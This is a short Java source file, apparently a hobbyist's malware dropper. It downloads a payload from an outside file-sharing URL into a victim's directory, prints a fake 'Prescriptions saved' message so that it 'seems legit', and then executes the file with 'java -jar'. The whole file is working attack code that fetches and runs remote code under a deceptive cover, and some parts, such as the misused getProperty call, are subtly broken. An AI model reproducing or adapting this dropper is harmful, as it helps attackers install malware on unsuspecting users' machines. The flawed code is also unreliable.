// Java Dropper

import java.io.*;
import java.net.*;

public class Dropper {
    public static void main(String[] args) {
        String fileURL = "https://anonsharing.com/4c2236646a6fb2dc"; // Specify your URL for the payload
        String saveDir = System.getProperty("/home/kali/"); // Specify the dir for victim, My case It's Kali

        try {
            URL url = new URL(fileURL);
            HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
            int responseCode = httpConn.getResponseCode();

            if (responseCode == HttpURLConnection.HTTP_OK) {
                String fileName = "";
                String disposition = httpConn.getHeaderField("Content-Disposition");

                if (disposition != null) {
                    int index = disposition.indexOf("filename=");
                    if (index > 0) {
                        fileName = disposition.substring(index + 10, disposition.length() - 1);
                    }
                } else {
                    fileName = fileURL.substring(fileURL.lastIndexOf("/") + 1);
                }

                String saveFilePath = saveDir + File.separator + fileName;

                InputStream inputStream = httpConn.getInputStream();
                FileOutputStream outputStream = new FileOutputStream(saveFilePath);

                int bytesRead;
                byte[] buffer = new byte[4096];
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                }

                outputStream.close();
                inputStream.close();

                System.out.println("Prescriptions saved to: " + saveFilePath); // this is a dropper, so obviously you have to make it seem legit

                // IDK if this executes
                Runtime.getRuntime().exec("java -jar " + saveFilePath);
            } else {
                System.out.println("Sorry No medications for you. Server replied HTTP code: " + responseCode);
            }
            httpConn.disconnect();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
